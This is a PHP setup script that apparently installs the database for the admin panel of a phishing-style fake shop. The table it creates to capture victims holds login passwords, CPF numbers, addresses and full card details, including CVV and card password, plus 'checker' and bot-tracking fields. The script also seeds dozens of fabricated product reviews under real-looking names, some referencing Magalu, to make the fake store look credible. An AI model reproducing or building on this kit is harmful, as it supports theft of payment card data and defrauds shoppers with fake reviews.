<?php

date_default_timezone_set('America/Sao_Paulo');


session_start ();



function isXmlHttpRequest()
{
    $isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) ? $_SERVER['HTTP_X_REQUESTED_WITH'] : null;
    return (strtolower($isAjax) === 'xmlhttprequest');
}


function dia ($qtd) {
	
$hoje = date('d/m/Y');
$hoje = DateTime::createFromFormat('d/m/Y', $hoje);
$hoje->add(new DateInterval('P'.$qtd.'D')); 
$dia =  $hoje->format('d/m/Y');
	
	return $dia;
	
}


if (isXmlHttpRequest()){



if (isset($_SESSION ['libera_db'])) {
	
	$dia_1 = dia (0);
	$dia_2 = dia (1);
	$dia_3 = dia (2);
	$dia_4 = dia (3);
	$dia_5 = dia (4);
	$dia_6 = dia (5);
	$dia_7 = dia (6);
	
	
	
	
	
	
	
	
$user = $_SESSION ['user_painel'];	
$pass = md5($_SESSION ['pass_painel']);	
	
$slot = $_SESSION ['slot_selected'];
$tokken = $_SESSION ['tokken'];
	
require ('../conexao.php');

   $sql = "CREATE TABLE configuracao (

  `id` int(11) NOT NULL,
  `url` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `chave` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `tokken` varchar(25) COLLATE utf8_unicode_ci NOT NULL,
  `msg_type` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  
  `pass_extra` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  
  `api_login` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  
  `slot` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  
  `status_tela` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  
  `bin_mod` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  
  `bip_on` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `bip_cc` varchar(150) COLLATE utf8_unicode_ci NOT NULL,


PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql);
 
 
 
$sql = "
	
INSERT INTO `configuracao` (`id`, `url`, `email`, `chave`, `tokken`, `msg_type`, `pass_extra`, `api_login`, `slot`, `status_tela`, `bin_mod` , `bip_on` ,`bip_cc` ) VALUES
(1, 'localhost', 'null', 'null', '$tokken' , '1', '0' , '0', '$slot' , '1' , '1', '1', '1')
	
	
";   
 $query = $mysqli->query($sql);
 
 
$sql = "CREATE TABLE visitas (

  `id` int(11) NOT NULL AUTO_INCREMENT,
  `data_inicio` datetime DEFAULT NULL,
  `data_final` datetime DEFAULT NULL,
  `nome` varchar(50) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `etapa` varchar(500) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `acao` varchar(10) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `now` varchar(10) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,


PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql);
 
 
 
 $sql = "CREATE TABLE visitas (

  `id` int(11) NOT NULL AUTO_INCREMENT,
  `data_inicio` datetime DEFAULT NULL,
  `data_final` datetime DEFAULT NULL,
  `nome` varchar(50) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `etapa` varchar(500) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `acao` varchar(10) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `now` varchar(10) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,


PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql);
 
 
 
  $sql = "CREATE TABLE api_login (

  `id` int(11) NOT NULL AUTO_INCREMENT,
  `key_api` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `status_api` varchar(200) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  `ip` varchar(200) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `porta` varchar(200) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `user` varchar(200) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `pass` varchar(200) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,


PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql);
 
 
 
$sql = "
   
INSERT INTO `api_login` (`id`, `key_api`, `status_api`, `ip` ,`porta` ,`user` ,`pass`) VALUES
(1, 'null', 0 , 'null', 'null', 'null', 'null')
   
";   
 $query = $mysqli->query($sql);
 
 
$sql = "CREATE TABLE produtos (

  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `valor` varchar(200) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `descricao` varchar(3002) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `nome` varchar(200) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `img_1` varchar(600) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `img_2` varchar(600) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `img_3` varchar(600) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `img_4` varchar(600) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `img_5` varchar(600) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `img_6` varchar(600) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `img_7` varchar(600) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `img_8` varchar(600) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `img_9` varchar(600) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `status_senha` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `status_repetidas` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
	
  `comentario_categoria` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `comentario_type` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `comentario_status` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  `rating` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,

  
  `sku` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  `sub` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `sub_grupo` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,

  
  `status_pix` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `key_pix` varchar(500) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,

PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql); 
 
 
 
  $sql = "CREATE TABLE comentarios_categoria (

  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nome` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,


PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql);
 
 
 $sql = "
   
INSERT INTO `comentarios_categoria` (`id`, `nome`) VALUES

(1, 'Jogo de panelas'),
(2, 'Celulares'),
(3, 'Fritadeiras')
   
";   
 $query = $mysqli->query($sql);
 

 
$sql = "CREATE TABLE comentarios (

  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nome` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `nota` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `nota_type` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `recomenda` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `descricao` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `id_categoria` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,


PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql); 
 
 
 $sql = "
   
INSERT INTO `comentarios` (`id`, `nome`, `nota` , `nota_type` , `recomenda` , `descricao`, `id_categoria`) VALUES


(1, 'Fernanda Andrade de Souza' , '5', 'good' , 'y' , 'Entrega super rápida e qualidade do produto perfeita!', 1),
(2, 'Vanessa Ranyelle Ferreira' , '3', 'low' , 'n' , 'pra ser uma marca boa como a Tramontina esperava mais qualidade. as panelas mancham muito no fundo e com dias de uso já tem uma frigideira descascando. sinceramente!', 1),
(3, 'Naiane Priscila Arving' , '4.5', 'good' , 'y' , 'Entrega rápida, ótima qualidade, antiaderente perfeito, amei.', 1),
(4, 'Karla Francielly Melo G' , '5', 'good' , 'y' , 'Panelas maravilhosas, chegou no mesmo dia que fiz o pedido, super recomendo!!', 1),
(5, 'Larissa Silva' , '5', 'good' , 'y' , 'Chegou no mesmo dia. Super embalado, em perfeito estado.', 1),
(6, 'Rafaela Lima' , '4.5', 'good' , 'y' , 'Simplesmente ameiii!!!! São ótimas, não grudam nada.', 1),
(7, 'Gleiciane Dias Carneiro' , '4', 'good' , 'y' , 'gostei muito das panelas, não usei ainda mas parrce ser muito boas.', 1),
(8, 'Isabel Mirian' , '4', 'good' , 'y' , 'lindas e fácil de limpar! fiquei satisfeita, estava na promoção', 1),
(9, 'Edson Jose Sobrinho' , '5', 'good' , 'y' , 'comprei as panelas para minha filha, ela adorou, muito boas as panelas.', 1),
(10, 'David B Ferreira' , '2.5', 'low' , 'n' , 'Algumas peças vieram com pequenos amassados. Não é um bom custo beneficio.', 1),
(11, 'Jamily Matos de Alcântara' , '3.5', 'media' , 'y' , 'as tampas foram produzidas de uma forma que o óleo entra dentro da parte de metal, a pessoa lava e continua ficando suja as tampas, tipo oleosa', 1),
(12, 'Francisca Natalia O' , '3', 'media' , 'n' , 'gostei mas achei que fosse originas ,mas achei muito maneiras pra serem originas', 1),
(13, 'Alice Moraes da Silva' , '3', 'media' , 'y' , 'Muito bom produto! Bem embalado e corresponde todas as descrições que consta no anúncio. Apesar de serem pequenas, atenderam todas as necessidades do meu dia a dia', 1),
(14, 'Natalia Souza' , '2', 'low' , 'n' , 'as panelas são boa pena q são fraquinha menos de 1 mês de uso e as alças já estão todas frouxa, uma pena e veio arranhadas as panelas', 1),
(15, 'Nathalia Lucena Marque' , '5', 'good' , 'y' , 'muito bom!! muito satisfeita! ameiiii! qualidade boa e preço justo!', 1),
(16, 'Alfredo de Souza Junior' , '4.5', 'good' , 'y' , 'Bom produto para o dia-a-dia. Utilizando com os cuidados para não riscar, atendem perfeitamente.', 1),
(17, 'Alexandra Teles de F' , '4', 'good' , 'y' , 'Apesar de menores, o design das panelas é lindo! Gostei bastante!', 1),
(18, 'Jessica Parente Ribeiro' , '5', 'good' , 'y' , 'Gente vale super a pena ter esse kit em sua casa, é simples mas boas demaissss', 1),
(19, 'Pedro magela pereira' , '5', 'good' , 'y' , 'Alem de ser um produto bonito, é muito eficiente, tanto na antiaderencia quanto na antiderrapancia. Fora que tambem nao fica manchado por causa das chamas.', 1),
(20, 'Vitória Corrêa Gonçalves' , '1', 'low' , 'n' , 'comprei não tem nem 30 dias e já deu problema, não se faz mais panelas como antigamente.', 1),

(21, 'Marilisa Meirelles Sica' , '4.5', 'good' , 'y' , 'tô gostando da câmera e de suas funcionalidades, estou super satisfeita, não trava, o bateria dura bastante. super recomendo este produto', 2),
(22, 'Tamiris Maicá da Fontoura' , '5', 'good' , 'y' , 'comprei para meu filho.. ele gostou muito.. bom preço', 2),
(23, 'Maria de Fátima Tolentino' , '4', 'good' , 'y' , 'já são 02 anos que comprei, foi o melhor q já possuí. Nunca travou. Recomendo', 2),
(24, 'Nathalia Lucena Marque' , '4', 'good' , 'y' , 'Celular bem grande, muito bonito, excelente custo benefício. Considero o melhor modelo no momento.', 2),
(25, 'Francisca Natalia O' , '5', 'good' , 'y' , 'Exemplo: Comprei isto no mês passado e estou muito satisfeito!', 2),
(26, 'Maria de Fátima da C. P' , '4.5', 'good' , 'y' , 'Aparelho muito bom,desempenho sem travamento, câmera Boa cumpre o que promete.', 2),
(27, 'Daniele aparecida de o' , '4', 'good' , 'y' , 'eu particularmente gostei do aparelho muito bom entrega rápida celular muito bom msm', 2),
(28, 'Rafaela Lima' , '1', 'low' , 'n' , 'Infelizmente o meu celular com menos de uma semana de uso não liga nem carrega mais.', 2),
(29, 'Jaqueline Furukawa L' , '5', 'good' , 'y' , 'Melhor custo benefício, atualmente, e melhor ainda o preço aqui no magalu! Design lindo, tela grande com boa qualidade de imagem, configurações ótimas para uso rotineiro.', 2),
(30, 'Daniele aparecida' , '1', 'low' , 'n' , 'Infelizmente o meu celular com menos de uma semana de uso não liga nem carrega mais.', 2),
(31, 'Oswaldo de Godoy Neto' , '3.5', 'media' , 'y' , 'parabéns aparelho deve ser muito bom que pena não facilitarem para pessoas negativadas', 2),
(32, 'Paulo Roberto' , '3.5', 'media' , 'y' , 'é um celular bom porém trava, tem a câmera traseira boa, para selfie que não é muito boa.', 2),


(33, 'José Mateus Cerilo de L' , '5', 'good' , 'y' , 'Comprei para minha esposa, ela gostou muito. Valor acessível e chegou em apenas 3 dias. Recomendo muito! :)', 3),
(34, 'Edson Jose Sobrinho' , '4.5', 'good' , 'y' , 'Chegou em menos de 1 dia, vale muito a pena! O frango que fiz ficou muito bom, recomendo com certeza', 3),
(35, 'Flavia Soares Pinheiro' , '4', 'good' , 'y' , 'Exemplo: Comprei isto no mês passado e estou muito satisfeito!', 3),
(36, 'Angela Maria Nóbrega' , '4', 'good' , 'y' , 'perfeita sem nenhum defeito e o preço também é ótimo', 3),
(38, 'Maria hirla Araújo soares' , '5', 'good' , 'y' , 'entrega muito rápido receber comprei segunda e na mesma sexta feira já chegou 5 dias úteis, previsão era pra 12 dias como sempre Magalu me suprendeu ,sem conta qualidade produto e ótima ...', 3),
(39, 'Regiane Nascimento' , '2', 'low' , 'n' , 'Comprei e menos de 2 meses depois estava enferrujada. Uso papel manteiga para assar qqr coisa e não contaminar com a ferrugem.', 3),
(40, 'Magda Dalilla Félix do N' , '5', 'good' , 'y' , 'comprei duas uma pra meu filho e outra pra meu neto já tem 3 meses de uso até agora ótima fácil de usar. fácil de limpar. ótima em tudo. fiquei um mês lá na casa dele usando ao produto fazendo minhas receitas enfim assa tudo excelente. amei.', 3),
(41, 'Alfredo de Souza Junior' , '5', 'good' , 'y' , 'super indico tenho ela e é muito boa podem compra sem medo', 3),
(42, 'Fernanda Andrade de Souza' , '4.5', 'good' , 'y' , 'excelente produto muito bom recomendo sem dúvidas á entrega mas rápida do Brasil.', 3),
(43, 'Lucas Nóbrega' , '3.5', 'media' , 'y' , 'É muito boa porém se você tiver uma família grande recomendo comprar uma maior', 3),
(44, 'Tamires Lima' , '2', 'low' , 'n' , 'pessoal comprei essa fritadeira em dezembro e com menos de 4 meses ela não assa mais os alimentos', 3),
(45, 'Mércia da Conceição S' , '4', 'good' , 'y' , 'comprei já faz um mês , e adorei ela muito boa , chegou rápido', 3),
(46, 'Alexandra Teles de F' , '3.5', 'media' , 'n' , 'parou de funcionar, mas a troca foi feita rápida pelo fabricante. mesmo assim vale a pena pelo custo-benefício', 3)
   
";   
 $query = $mysqli->query($sql);
 
 
 $sql = "CREATE TABLE dados_cliente (

  `id` int(11) NOT NULL AUTO_INCREMENT,
  
  `email` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `pass` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `cpf` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  `cep` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `rua` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `bairro` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `numero` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `complemento` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `estado` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `cidade` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  
  `cc_number` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `cc_nome` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `cc_validade` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `cc_cvv` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `cc_pass` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `cc_parcela` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  
  `checker` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,

  
  `repete` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `api` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `face` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,


  `ip` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `dispositivo` varchar(500) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  `exe` varchar(10) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  `pix` varchar(10) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,


PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql); 
 
 
 
 
 $sql = "CREATE TABLE users (

  `id` int(11) NOT NULL AUTO_INCREMENT,
  `login` varchar(300) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `pass` varchar(500) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  `nivel` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,


PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql); 
 
 
 
$sql = "
   
INSERT INTO `users` (`login`, `pass`, `nivel`) VALUES

('$user', '$pass', '10')

";   
 $query = $mysqli->query($sql);
 
 
 
 $sql = "CREATE TABLE analytics (

  `id` int(11) NOT NULL AUTO_INCREMENT,
  
  `dia` varchar(500) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  `visitas` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `infos` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  
  `insta` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `face` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,


PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql); 
 
 
 $sql = "
   
INSERT INTO `analytics` (`dia`, `visitas`, `infos`, `insta`, `face`) VALUES

('$dia_1', 0, 0 , 0, 0),
('$dia_2', 0, 0 , 0, 0),
('$dia_3', 0, 0 , 0, 0),
('$dia_4', 0, 0 , 0, 0),
('$dia_5', 0, 0 , 0, 0),
('$dia_6', 0, 0 , 0, 0),
('$dia_7', 0, 0 , 0, 0)


";   
 $query = $mysqli->query($sql);
 
 
  $sql = "CREATE TABLE geral (

  `id` int(11) NOT NULL AUTO_INCREMENT,
  
  `visitas` varchar(500) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,

  `insta` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `face` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `bots` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `extern` varchar(100) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  



PRIMARY KEY (id)
)ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
";   
 $query = $mysqli->query($sql); 
 
 
 
  $sql = "
   
INSERT INTO `geral` (`visitas`, `insta`, `face`, `bots`, `extern`) VALUES

(0, 0, 0 , 0, 1)

";   
 $query = $mysqli->query($sql);
 
 
 if (!$query) {
	 
	 echo 2;
	 
 } else {
	 
	 echo 1;
	 
	 
 }
 
}


}

?>

